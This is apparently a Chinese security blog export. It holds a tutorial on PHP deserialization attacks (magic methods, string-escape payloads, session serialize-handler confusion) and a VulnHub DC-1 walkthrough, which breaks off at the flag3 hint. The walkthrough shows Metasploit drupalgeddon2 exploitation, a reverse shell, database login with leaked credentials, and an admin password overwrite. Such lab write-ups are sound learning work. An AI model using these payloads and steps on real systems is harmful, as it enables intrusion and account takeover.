<p>在命名自己的类方法时不能使用这些名称，除非是想使用其魔法函数功能</p>
<h3 id="construct和-destruct"><a href="#construct和-destruct" class="headerlink" title="__construct和__destruct"></a>__construct和__destruct</h3><ol>
<li>__construct</li>
</ol>
<p>用法：</p>
<pre class="language-none"><code class="language-none">void __construct([mixed $args[, $...]])</code></pre>

<p>PHP5允许开发者在一个类中定义一个方法作为构造函数</p>
<p>具有构造函数的类会在每次创建新对象时先调用此方法，所以__construct函数非常适合在使用对象之前做一些初始化工作</p>
<ol start="2">
<li>__destruct</li>
</ol>
<p>用法：</p>
<pre class="language-none"><code class="language-none">void __destruct(void)</code></pre>

<p>PHP5引入了析构函数的概念，这类似于其他面对对象的语言，如C++</p>
<p>__destruct函数是对象被销毁的时候进行调用，通常PHP在程序块执行结束时进行垃圾回收，这将进行对象销毁，然后自动触发__destruct魔术方法</p>
<ol start="3">
<li>代码示例</li>
</ol>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">MyTestClass</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">print</span> <span class="token string double-quoted-string">"In constructor&lt;br>"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token string double-quoted-string">"MyTestClass"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">print</span> <span class="token string double-quoted-string">"Destructing "</span> <span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyTestClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
</code></pre>

<img src="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210801125655886.png" class="" loading="lazy">

<p>创建MyTestClass类的新对象时，会调用__construct函数，输出In constructor</p>
<p>对象被销毁时，会调用__destruct()函数，输出Destructing MyTestClass</p>
<h3 id="sleep和-wakeup"><a href="#sleep和-wakeup" class="headerlink" title="__sleep和__wakeup"></a>__sleep和__wakeup</h3><ol>
<li>__sleep</li>
</ol>
<p>serialize函数会检查类中是否存在__sleep函数，如果存在，该函数会先被调用，然后才执行序列化操作</p>
<p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组</p>
<p>如果该函数未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误</p>
<blockquote>
<p>__sleep函数不能返回父类的私有成员的名字，这样做会产生一个E_NOTICE级别的错误，该函数可以用serializable接口来代替</p>
<p>__sleep函数常用于提交未提交的数据或进行类似的清理操作</p>
</blockquote>
<ol start="2">
<li>__wakeup</li>
</ol>
<p>unserialize函数会检查是否存在__wakeup函数，如果存在，则会先调用__wakeup函数，预先准备对象需要的资源</p>
<p>__wakeup函数常用在反序列化操作中，例如，重新建立数据库连接或执行其他初始化操作</p>
<ol start="3">
<li>代码示例</li>
</ol>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Foo</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">aMemberFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token string double-quoted-string">"aFuncName"</span><span class="token punctuation">;</span>
        <span class="token keyword">print</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>wakeup&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>sleep&lt;br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$tr</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'O:3:"Foo":1:&#123;s:9:"aFuncName";s:11:"aMemberFunc";&#125;'</span><span class="token punctuation">;</span>
<span class="token variable">$ttr</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$tr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ttr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$foo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">;</span>
<span class="token variable">$foo</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token string double-quoted-string">"abc"</span><span class="token punctuation">;</span>
<span class="token variable">$tr</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$foo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">print</span> <span class="token variable">$tr</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
</code></pre>

<img src="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210801140429171.png" class="" loading="lazy">

<p>反序列化后，会自动调用__wakeup函数，输出wakeup</p>
<p>序列化对象后，会自动调用__sleep函数，输出sleep</p>
<h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><h3 id="过滤后增加字符"><a href="#过滤后增加字符" class="headerlink" title="过滤后增加字符"></a>过滤后增加字符</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">change</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"xx"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span>
<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$old</span> <span class="token operator">=</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$new</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$old</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>字符串："</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>序列化字符串："</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>过滤后："</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$old</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>反序列化字符串："</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>逃逸前："</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>$arr[1]='</span><span class="token operator">.</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>

<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token variable">$new</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>逃逸后："</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>$arr[1]='</span><span class="token operator">.</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>传入<code>a=xxxxxxxxxxxxxxxxx&quot;;i:1;s:4:&quot;flag&quot;;&#125;</code></p>
<img src="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210803121403173.png" class="" loading="lazy">成功将wtf替换成flag

<p>下面讲讲原理</p>
<p>在字符串反序列化时，unserialize函数是依据字符串长度来判断字符串范围的，例如：</p>
<img src="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210803112616148.png" class="" title="image-20210803112616148" loading="lazy">

<p>此字符串反序列化时，会将双引号内的34个字符视为数组的第一个元素</p>
<p>如果双引号内字符不是对应的个数，那么反序列化就会返回false</p>
<p>传入的<code>&quot;;i:1;s:3:&quot;wtf&quot;;&#125;</code>是17个字符，由于str_replace函数会将<code>x</code>替换成<code>xx</code>，17个<code>x</code>会变成34个<code>x</code>，多出来的17个<code>x</code>造成了<code>&quot;;i:1;s:3:&quot;wtf&quot;;&#125;</code>的溢出，而<code>&quot;</code>闭合了字符串，成功逃逸，可以被反序列化</p>
<p>最后的<code>;&#125;</code>闭合反序列化全过程，导致原来的<code>&quot;;i:1;s:4:&quot;flag&quot;;&#125;&quot;</code>被截断，但不影响反序列化过程</p>
<h3 id="过滤后减少字符"><a href="#过滤后减少字符" class="headerlink" title="过滤后减少字符"></a>过滤后减少字符</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">change</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"x"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'wtf'</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$old</span> <span class="token operator">=</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$new</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$old</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>字符串："</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>序列化字符串："</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>过滤后："</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$old</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>反序列化字符串："</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>逃逸前："</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>$arr[1]='</span><span class="token operator">.</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>

<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token variable">$new</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>逃逸后："</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>$arr[1]='</span><span class="token operator">.</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>传入<code>a=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;b=&quot;;i:1;s:4:&quot;flag&quot;;i:2;s:4:&quot;flag</code></p>
<img src="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210803121210850.png" class="" loading="lazy">

<p>成功将wtf替换成flag</p>
<p>原理跟上面差不多，这里就不多赘述了</p>
<p>把它原有的字符_吃掉_，再换上我们需要的字符，每一个x都会_吃掉_一个字符</p>
<h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2><h3 id="SESSION变量直接可控"><a href="#SESSION变量直接可控" class="headerlink" title="$_SESSION变量直接可控"></a>$_SESSION变量直接可控</h3><p>php引擎的存储格式是<code>键名|serialized_string</code></p>
<p>php_serialize引擎的存储格式是<code>serialized_string</code></p>
<p>如果程序使用两个引擎来分别处理的话就会出现问题</p>
<p>代码示例</p>
<pre class="language-php" data-language="php"><code class="language-php">#1.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nayst'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
    
#2.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>首先访问1.php，传入参数<code>a=|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:8:&quot;y4tacker&quot;;&#125;</code>再访问2.php</p>
<img src="/2021/09/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210803163358423.png" class="" loading="lazy">

<p>由于<code>1.php</code>是使用<code>php_serialize</code>引擎处理，因此只会把<code>&#39;|&#39;</code>当做一个正常的字符</p>
<p>然后访问<code>2.php</code>，由于用的是<code>php</code>引擎，因此遇到<code>&#39;|&#39;</code>时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对<code>&#39;|&#39;</code>后的值进行反序列化处理</p>
<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web漏洞</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub-DC-1</title>
    <url>/2022/04/07/VulnHub-DC-1/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>VulnHub靶场练习，练习渗透技巧，作为初学者，主要学习攻击方法。</p>
<p>在VMware中搭建环境，网络选择NAT或者桥接，确保攻击机和靶机在同一网络下即可，我这里选择的NAT。</p>
<p>靶机：192.168.254.129（<a href="https://www.vulnhub.com/entry/dc-1,292/">DC-1</a>）</p>
<p>攻击机：192.168.254.128（Kali）</p>
<p>物理机：192.168.254.1（Windows10）</p>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><p>渗透测试的第一步，网络探测。</p>
<p>作用：扫描靶机的IP及端口号信息，可以知道目标开启了哪些端口和服务。</p>
<p>这里总结了三种方法：</p>
<ol>
<li>arp-scan</li>
</ol>
<p>用于探测同一区域中存活主机，一款kali自带的一款轻量<strong>ARP扫描工具</strong>，该工具会自动解析MAC地址，得到对应硬件厂商。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> arp-scan -l</code></pre>

<p>常用指令：</p>
<ul>
<li>-f <s>从指定文件中读取主机名或地址：arp-scan -f IP.txt</li>
<li>-l 从网络接口配置生成地址</li>
<li>-i 各扫描之间的时间差 ：arp-scan -l -i 1000</li>
<li>-r 每个主机扫描次数 :arp-scan -r 5</li>
<li>-V 显示程序版本并退出</li>
<li>-t <i>设置主机超时时间 arp-scan -t 1000 10.10.10.0&#x2F;24</li>
<li>-I <s>使用网络接口 : arp-scan -I eth0</li>
<li>-g 不显示重复的数据</li>
<li>-D 显示数据包往返时间</li>
</ul>
<img src="/2022/04/07/VulnHub-DC-1/image-20220407013729808.png" class="" title="image-20220407013729808" loading="lazy">

<ol start="2">
<li>netdiscover</li>
</ol>
<p>用于探测存活主机</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> netdiscover -i eth0</code></pre>

<img src="/2022/04/07/VulnHub-DC-1/image-20220407013931529.png" class="" title="image-20220407013931529" loading="lazy">

<ol start="3">
<li>NMap</li>
</ol>
<p>也就是Network Mapper，其基本功能有三个：</p>
<p>（1）扫描主机端口，嗅探所提供的网络服务。</p>
<p>（2）探测一组主机是否在线。</p>
<p>（3）推断主机所用的操作系统，到达主机经过的路由，系统已开放端口的软件版本。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap -sn <span class="token number">192.168</span>.254.1/24

-sn 仅扫描主机，不扫描端口</code></pre>

<img src="/2022/04/07/VulnHub-DC-1/image-20220407015439110.png" class="" title="image-20220407015439110" loading="lazy">

<pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap -sV -p- <span class="token number">192.168</span>.0.119

-sV 用来扫描目标主机和端口上运行的软件的版本
-p- 扫描0-65535全部端口</code></pre>

<img src="/2022/04/07/VulnHub-DC-1/image-20220407015550030.png" class="" title="image-20220407015550030" loading="lazy">

<p>目标靶机开放了80端口，在浏览器打开该站点</p>
<h2 id="查看网页相关信息"><a href="#查看网页相关信息" class="headerlink" title="查看网页相关信息"></a>查看网页相关信息</h2><p>使用插件<code>wappalyzer</code>查看网站的相关信息。</p>
<img src="/2022/04/07/VulnHub-DC-1/image-20220407015752062.png" class="" title="image-20220407015752062" loading="lazy">

<p>可以看到该网站使用CMS为<code>Drupal</code>，版本号为<code>7</code>，其实在网页界面和底部都能发现是Drupal。</p>
<h1 id="漏洞扫描及利用"><a href="#漏洞扫描及利用" class="headerlink" title="漏洞扫描及利用"></a>漏洞扫描及利用</h1><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>在 MSF 中搜索 Drupal</p>
<img src="/2022/04/07/VulnHub-DC-1/image-20220407020613332.png" class="" title="image-20220407020613332" loading="lazy">

<p>可以看到共有8个漏洞</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在8个漏洞中，优先选择Rank为Excellent，且更新时间最新的。</p>
<p>这里就选择第二个（drupal_drupalgeddon2），查看他需要哪些参数，把参数补充完整。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ use <span class="token number">1</span>
$ show options
$ <span class="token builtin class-name">set</span> RHOST <span class="token number">192.168</span>.254.129</code></pre>

<img src="/2022/04/07/VulnHub-DC-1/image-20220407021149261.png" class="" title="image-20220407021149261" loading="lazy">

<p>成功利用并反弹shell！</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ exploit

<span class="token comment">#run也是可以的</span></code></pre>

<img src="/2022/04/07/VulnHub-DC-1/image-20220407021411829.png" class="" title="image-20220407021411829" loading="lazy">

<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>在当前目录下发现<code>flag1.txt</code>。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> flag1.txt</code></pre>

<img src="/2022/04/07/VulnHub-DC-1/image-20220407021624488.png" class="" title="image-20220407021624488" loading="lazy">

<blockquote>
<p>Every good CMS needs a config file - and so do you.</p>
</blockquote>
<p>翻译过来就是：每个好的CMS都需要一个配置文件 - 你也是。</p>
<p>提示我们下一步：找配置文件。</p>
<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>Drupal的默认配置文件为 <code>/var/www/sites/default/settings.php</code>，这里没有改路径，所以很轻松就拿到了。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> sites/default/settings.php</code></pre>

<img src="/2022/04/07/VulnHub-DC-1/image-20220407021947350.png" class="" title="image-20220407021947350" loading="lazy">

<p>成功拿到<code>flag2</code>和SQL数据库账户</p>
<blockquote>
<p>Brute force and dictionary attacks aren’t the only ways to gain access (and you WILL need access).</p>
<p>What can you do with these credentials?</p>
</blockquote>
<p>翻译过来就是：蛮力和字典攻击不行，唯一方法是获得访问权限(你将需要访问的)。你能用这些凭证做什么?</p>
<p>这里提示我们<strong>提权</strong>，先看看数据库里有什么吧。</p>
<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>有了账号密码可以登录数据库，前提是要有一个<strong>交互式shell</strong>。</p>
<p>这里利用python反弹一个交互式shell，然后登录数据库。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>

$ mysql -udbuser -pR0ck3t</code></pre>

<img src="/2022/04/07/VulnHub-DC-1/image-20220407022644433.png" class="" title="image-20220407022644433" loading="lazy">

<p>通过查询发现admin用户的账号和密码！</p>
<img src="/2022/04/07/VulnHub-DC-1/image-20220407023005022.png" class="" title="image-20220407023005022" loading="lazy">

<p>显然是通过加密后的，可以想办法更新密码。参考<a href="https://drupalchina.cn/node/2128">忘记Drupal的管理员密码的解决办法</a>。</p>
<p>通过使用脚本加密明文后覆盖管理员密码。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ php scripts/password-hash.sh <span class="token number">123456</span></code></pre>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">update drupaldb.users set pass &#x3D; &quot;$S$DzvV5UtPzee8dAs0n&#x2F;dgWpbNvwm98YP8YX8WBM3zbpM04PIBN77G&quot; where name &#x3D; &quot;admin&quot;;</code></pre>

<img src="/2022/04/07/VulnHub-DC-1/image-20220407023723120.png" class="" title="image-20220407023723120" loading="lazy">

<p>成功以管理员身份登录！</p>
<p>在<code>content</code>页面拿到<code>flag3</code></p>
<img src="/2022/04/07/VulnHub-DC-1/image-20220407023851962.png" class="" title="image-20220407023851962" loading="lazy">

<blockquote>
<p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
</blockquote>
<p>翻译：特殊的PERMS将帮助找到passwd - 但你需要执行该命令来弄清楚如何获得阴影中的东西。</p>
